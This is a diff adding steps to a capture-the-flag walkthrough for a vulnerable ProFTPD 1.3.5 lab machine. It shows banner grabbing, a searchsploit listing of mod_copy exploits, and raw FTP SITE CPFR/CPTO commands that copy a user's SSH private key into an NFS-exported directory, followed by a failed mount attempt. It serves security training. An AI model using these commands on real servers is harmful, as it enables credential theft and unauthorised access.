@@ -135,6 +135,50 @@ Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
 8. Question `What mount can we see?` Answer `/var`
 
 ## Gain initial access with ProFtpd
+1. Question `What is the version?` (FTP) Answer `1.3.5`
+```bash
+nc 10.10.245.171 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.245.171]
+```
+2. Question `How many exploits are there for the ProFTPd running?` Answer `4`
+```bash
+searchsploit proftp 1.3.5
+[i] Found (#2): /opt/exploit-database/files_exploits.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/opt/exploit-database")
+
+[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/opt/exploit-database")
+
+-------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                            |  Path
+-------------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                 | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                       | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                   | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                 | linux/remote/36742.txt
+-------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+3. Copied `id_rsa` file according to given instruction
+```bash
+nc 10.10.245.171 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.245.171]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+```
+4. Mount NFS as instruction
+```bash
+root@system:/tmp# mkdir /mnt/kenobiNFS
+root@system:/tmp# mount 10.10.245.171:/var /mnt/kenobiNFS
+mount: /mnt/kenobiNFS: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.
+root@system:/tmp# ls -la /mnt/kenobiNFS
+total 8
+drwxr-xr-x 2 root root 4096 Feb 29 10:03 .
+drwxr-xr-x 3 root root 4096 Feb 29 10:03 ..
+```
+5. 
 ## Privilege Escalation with Path Variable Manipulation 
 
 Author: Zishan Ahamed Thandar
